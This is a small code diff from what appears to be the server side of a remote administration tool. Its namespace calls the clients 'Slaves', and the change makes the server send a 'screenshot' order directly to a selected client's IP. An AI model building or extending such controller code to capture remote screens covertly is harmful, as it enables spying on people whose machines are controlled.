@@ -14,7 +14,8 @@ namespace SOURIS_Server.Slaves
             try
             {
                 int selected = MainWindow.main.listView1.SelectedIndex;
-                Slaves.SlaveList.List[selected].Nextinteract = "screenshot";
+                Form.FormUpdate.addlistbox("Trying to Screenshot :" + SlaveList.List[selected].IP);
+                Sockets.ClientOrder.StartClient("screenshot", SlaveList.List[selected].IP);
             }
             catch
             {
